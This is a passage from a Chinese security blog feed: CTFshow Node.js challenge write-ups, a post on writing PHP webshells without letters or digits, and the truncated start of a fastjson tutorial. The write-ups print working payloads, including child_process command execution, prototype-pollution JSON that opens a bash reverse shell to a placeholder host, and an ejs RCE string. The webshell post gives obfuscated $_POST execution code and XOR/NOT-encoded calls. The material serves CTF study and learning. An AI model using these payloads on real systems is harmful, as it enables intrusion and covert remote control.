class="line">文件操作</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readdirSync</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;fl001g.txt&#x27;</span>);</span><br></pre></td></tr></table></figure></p>
<h2 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h2><p>传入<br><code>require(&#39;child_process&#39;).execSync(&#39;ls /&#39;).toString()</code><br><code>require(&#39;child_process&#39;).exec(&#39;ls /&#39;)</code><br>均回显tql，盲猜过滤了exec<br>使用<br><code>require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;,[]).output;</code><br><code>require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl001g.txt&#39;]).output;</code><br>或者web335的读文件操作</p>
<h2 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>类似于php的传输入<br>payload: <code>/?a[x]=1&amp;b[x]=1</code></p>
<h2 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h2><p>原型链污染：<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript</a><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>看到copy这个函数的实现，可以想到原型链污染<br>根据app.js的路由，知道是routes/login.js这个文件<br>那么只需要抓取登录包，把post内容改为<br><code>&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code><br>即可获取flag</p>
<h2 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h2><blockquote>
<p>在做之前调试了一下nodejs，发现原型链污染完以后，在下次那个被污染的还是被污染，并不会在下次访问的时候就变成未被污染的状态</p>
</blockquote>
<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>只要把query进行变量覆盖，就可以进行任意命令执行</p>
<blockquote>
<p><strong>注意这里是大写Function，是一个构造器，可以把这里分解为两步看</strong><br><img src="/2022/11/28/ctfshow-nodejs/2.jpg" alt></p>
</blockquote>
<p>用如下payload访问login页面<br><code>&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/2334 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code><br>成功将query进行覆盖，再去访问api那个页面，就会反弹shell</p>
<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>主要是一个ejsRCE，参考链接：<a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/</a><br><code>&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/2334 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></p>
<h2 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br></pre></td></tr></table></figure>
<p>因为这次是复制user.userinfo的对象，所以需要两层<strong>proto</strong>，才能污染到最顶端的值，也就是<br><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/2334 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></p>
<h2 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h2><p>使用ejsRCE进行反弹shell，但是这次render点在index.js<br>所以对login进行了原型链污染以后，需要在访问一次index.js才能反弹shell</p>
<h2 id="web342-web343"><a href="#web342-web343" class="headerlink" title="web342   web343"></a>web342   web343</h2><p><a href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a><br>可以根据这篇文章进行调试<br>核心就是找到可覆盖点（可插入到模板中，且为undefined）</p>
<blockquote>
<p><strong>为什么要undefined</strong><br>因为只有在某个对象他没有定义这个变量的时候才会向上的prototype去寻找，否则就算污染了原型链也是没法利用的</p>
</blockquote>
<p>注意这里的payload要用execSync，不能用exec</p>
<h2 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h2><p>这题关键是多个相同的参数传递过去，nodejs会将其拼接为列表的形式<br><img src="/2022/11/28/ctfshow-nodejs/3.jpg" alt><br><img src="/2022/11/28/ctfshow-nodejs/4.jpg" alt><br>这里传参的时候要把payload复制到burp里面，如果浏览器直接访问，会出一些编码错误<br>payload<br><code>query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</code></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>webshell-奇淫技巧（php）</title>
    <url>/2022/11/29/webshell-%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%EF%BC%88php%EF%BC%89/</url>
    <content><![CDATA[<h2 id="无数字字母获取所有数字"><a href="#无数字字母获取所有数字" class="headerlink" title="无数字字母获取所有数字"></a>无数字字母获取所有数字</h2><p>通过boolean类型进行加减<br><span id="more"></span><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="literal">true</span>+<span class="literal">true</span>) == <span class="number">2</span>);         <span class="comment">// D:\phpstudy_pro\WWW\a.php:2:boolean true</span></span><br></pre></td></tr></table></figure><br>从两个真相加得到了2，那么布尔类型的都应该都可以进行加减<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单引号</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>+<span class="variable">$_</span>;                         <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 未定义变量</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$__</span>==<span class="variable">$__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>+<span class="variable">$_</span>;                         <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 未定义常量</span></span><br><span class="line"><span class="variable">$_</span> = _==_;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>+<span class="variable">$_</span>;                         <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 中括号</span></span><br><span class="line"><span class="variable">$_</span> = []==[];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>+<span class="variable">$_</span>;                         <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 获取0</span></span><br><span class="line"><span class="variable">$_</span> = []==[];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>-<span class="variable">$_</span>;                         <span class="comment">// 0</span></span><br><span class="line"><span class="comment">// 获取false</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>);                       <span class="comment">// D:\phpstudy_pro\WWW\a.php:3:boolean false</span></span><br></pre></td></tr></table></figure><br>总而言之就是拿着两个类型去比较，当然也可以用大于号小于号之类的去比较<br>当然有时候未定义的变量、常量，也可以当作false来用<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;kaikaix&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$b</span>];                        <span class="comment">//输出 k</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[_];                         <span class="comment">//输出 k</span></span><br></pre></td></tr></table></figure></p>
<h2 id="无数字字母获取所有的字母"><a href="#无数字字母获取所有的字母" class="headerlink" title="无数字字母获取所有的字母"></a>无数字字母获取所有的字母</h2><h3 id="数组拼接"><a href="#数组拼接" class="headerlink" title="数组拼接"></a>数组拼接</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;&#x27;</span>.[];                         <span class="comment">//字符串与数组拼接变成Array</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;_&#x27;</span>];                  <span class="comment">//false代表0，这里取到A</span></span><br><span class="line"><span class="variable">$___</span> = (<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>)+(<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>)+(<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>);  <span class="comment">//3个true相加为3</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>[<span class="variable">$___</span>];                     <span class="comment">//获取到a</span></span><br></pre></td></tr></table></figure>
<p>剩下的操作就是一些自加操作了，这样就可以获取到所有的字母了<br>在php中字母是可以自加的（不能自减），但是特殊字符不行<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>++;                               <span class="comment">//变成b</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;(&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>++;                               <span class="comment">//还是(</span></span><br></pre></td></tr></table></figure><br>这里我突发奇想，想看看class类型能不能拼接出Object字符串，null能不能拼接出字符串null，然而并不行，那么就只能先告一段落</p>
<h3 id="利用数学错误"><a href="#利用数学错误" class="headerlink" title="利用数学错误"></a>利用数学错误</h3><p>php中0/0会返回NAN，1/0会返回INF<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 0/0</span></span><br><span class="line"><span class="variable">$_</span> = (<span class="string">&#x27;&#x27;</span>!=<span class="string">&#x27;&#x27;</span>)/(<span class="string">&#x27;&#x27;</span>!=<span class="string">&#x27;&#x27;</span>);             <span class="comment">//false/false 报错 NAN</span></span><br><span class="line"><span class="variable">$_</span> .= <span class="string">&#x27;&#x27;</span>;                           <span class="comment">//将报错与字符串拼接，转换为字符串NAN</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//打印出 NAN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1/0</span></span><br><span class="line"><span class="variable">$_</span> = (<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>)/(<span class="string">&#x27;&#x27;</span>!=<span class="string">&#x27;&#x27;</span>);             <span class="comment">//true/false报错 INF</span></span><br><span class="line"><span class="variable">$_</span> .= <span class="string">&#x27;&#x27;</span>;                           <span class="comment">//将报错与字符串拼接，转换为字符串INF</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//打印INF</span></span><br></pre></td></tr></table></figure><br>当然上面的代码还是有点长的，可以用undefined的常量或变量相除，就会缩短代码长度<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//常量</span></span><br><span class="line"><span class="variable">$_</span>=_/_;</span><br><span class="line"><span class="variable">$_</span>.=_;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//输出NAN_</span></span><br><span class="line"><span class="comment">//缩短代码</span></span><br><span class="line"><span class="variable">$_</span>=(_/_._);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//输出NAN_</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//变量</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>/<span class="variable">$_</span>.<span class="variable">$_</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//输出NAN</span></span><br></pre></td></tr></table></figure><br>这样可以获取到NAN的字符串，那么提取第一个也就是N<br>因为POST这几个字母都在N后面，那么进行一些自加操作就可以获取到$_POST了，我这里抄一下别的师傅的代码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=(_/_._)[<span class="number">0</span>];                      <span class="comment">//直接拼接成字符串并切片</span></span><br><span class="line"><span class="variable">$o</span>=++<span class="variable">$a</span>;                            <span class="comment">//$o=++$a是先把$a进行自增，自增完成之后再将值返回，也就是这一句结束的时候 $a和$o都是O</span></span><br><span class="line"><span class="variable">$o</span>=++<span class="variable">$a</span>.<span class="variable">$o</span>;                         <span class="comment">//$o=&gt;PO,$a=&gt;P</span></span><br><span class="line"><span class="variable">$a</span>++;                               <span class="comment">//Q</span></span><br><span class="line"><span class="variable">$a</span>++;                               <span class="comment">//R</span></span><br><span class="line"><span class="variable">$o</span>.=++<span class="variable">$a</span>;                           <span class="comment">//$o=&gt;POS,$a=&gt;S</span></span><br><span class="line"><span class="variable">$o</span>.=++<span class="variable">$a</span>;                           <span class="comment">//$o=&gt;POST,$a=&gt;T</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$o</span>;                            <span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[_]);                     <span class="comment">//$_POST[0]($_POST[_]);</span></span><br></pre></td></tr></table></figure><br>在这里的变量名称最后替换成特殊字符就可以了<br>比如下图这些<br><img src="/2022/11/29/webshell-%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%EF%BC%88php%EF%BC%89/1.jpg" alt><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Ñ</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Ñ</span>;</span><br></pre></td></tr></table></figure></p>
<h3 id="gettext"><a href="#gettext" class="headerlink" title="gettext"></a>gettext</h3><p>当php安装了gettext扩展，这个扩展中_()相当于gettext()<br>相关文档 <a href="https://www.php.net/manual/en/book.gettext.php">https://www.php.net/manual/en/book.gettext.php</a><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];                       <span class="comment">//获取到N</span></span><br></pre></td></tr></table></figure><br>最后一些自加的顺序操作可以让你的webshell更短，但是这里就不细说了，因为我感觉有点没必要<br>可以参考这篇文章的底部<br><a href="https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah">https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah</a></p>
<h3 id="上传临时文件"><a href="#上传临时文件" class="headerlink" title="上传临时文件"></a>上传临时文件</h3><p>具体参考p神文章<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://xxx/test.php?code=&lt;?=`. /???/????????[@-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;ls&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br></pre></td></tr></table></figure><br>核心原理就是上传的文件会临时保存到/tmp/phpXXXXXX中，后面的X是随机字符<br>[@-[]这个代表?是从@-[，也就是所有的大写字母<br>那么命令执行就可以去执行这个临时文件</p>
<h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><h3 id="或"><a href="#或" class="headerlink" title="或"></a>或</h3><p>主要是通过特殊字符进行异或运算得到正常字符<br>比如<br><code>(&quot;%10%08%10%09%0e%06%0f&quot;|&quot;%60%60%60%60%60%60%60&quot;)()</code><br>运算完以后就是<br><code>phpinfo()</code><br>这里有相关的代码<br><a href="https://github.com/kaikaix/ctf/tree/main/phpshell/%E6%88%96">https://github.com/kaikaix/ctf/tree/main/phpshell/%E6%88%96</a><br>当然双引号可以替换为单引号<br>如果是直接复制到php文件中去执行的话需要先url decode才行<br><code>(&quot;    &quot;|&quot;```````&quot;)();</code></p>
<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>异或与或的原理类似<br><a href="https://github.com/kaikaix/ctf/tree/main/phpshell/%E5%BC%82%E6%88%96">https://github.com/kaikaix/ctf/tree/main/phpshell/%E5%BC%82%E6%88%96</a></p>
<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>这里用的yu22x的脚本<br><a href="https://github.com/kaikaix/ctf/tree/main/phpshell/%E5%8F%96%E5%8F%8D">https://github.com/kaikaix/ctf/tree/main/phpshell/%E5%8F%96%E5%8F%8D</a><br>这里是用php命令行去执行<br><img src="/2022/11/29/webshell-%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%EF%BC%88php%EF%BC%89/2.jpg" alt><br>如果没有参数可以把后面括号里面的东西删除<br><code>(~%8F%97%8F%96%91%99%90)();</code><br>同理，如果想在php中执行，也要先urldecode</p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>ctf</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson初学</title>
    <url>/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/</url>
    <content><![CDATA[<h2 id="fastjson基本用法"><a href="#fastjson基本用法" class="headerlink" title="fastjson基本用法"></a>fastjson基本用法</h2><span id="more"></span>
<p>文章的fastjson版本<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><br>fastjson主要是用来序列化与反序列化JavaBean<br>下面是一个简单的JavaBean对象<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student无参构造器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>下面将用fastjson来序列化上面的对象，将他们转换为json<br>新建一个文件StudentSer.java<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentSer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">serJson</span> <span class="operator">=</span> JSON.toJSONString(<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;kaikaix&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        System.out.println(serJson);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/1.jpg" alt><br>打印了getAge和getName，说明在序列化的时候会对getXxxx进行调用<br>当然不止toJSONString，还有toJSONBytes，具体可以看JSON.class类中的成员方法</p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>接下来就是反序列化了，这里的反序列化类似php，并不是读取字节文件，而是读取json格式的字符串<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentSer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">serJson</span> <span class="operator">=</span> JSON.toJSONString(<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;kaikaix&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        System.out.println(serJson);</span><br><span class="line">        System.out.printf(<span class="string">&quot;Parse had done =&gt; %s\n&quot;</span>,JSON.parse(serJson).getClass());</span><br><span class="line">        System.out.printf(<span class="string">&quot;parseObject has done =&gt; %s\n&quot;</span>,JSON.parseObject(serJson).getClass());</span><br><span class="line">        System.out.printf(<span class="string">&quot;parseObject(Student.class) has done =&gt; %s\n&quot;</span>,JSON.parseObject(serJson,Student.class).getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/2.jpg" alt><br>在这里进行了三次反序列化<br>主要就是parse和parseObject<br>但是观察parseObject的源码，其实也是对parse的一次封装，核心还是调用了parse，主要区别就是对parse后返回的obj调用了一次toJSON<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> parse(text);</span><br><span class="line">    <span class="keyword">return</span> obj <span class="keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们注意到，只有最后一次反序列化的时候调用了setXxx方法，因为最后一次传递了一个Student.class给他，fastjson才能知道这段String最后到底应该反序列化为哪个对象<br>而且反序列化的时候调用的构造函数是无参构造器，所以fastjson反序列化的JavaBean必须有无参构造器，否则就会报错</p>
<blockquote>
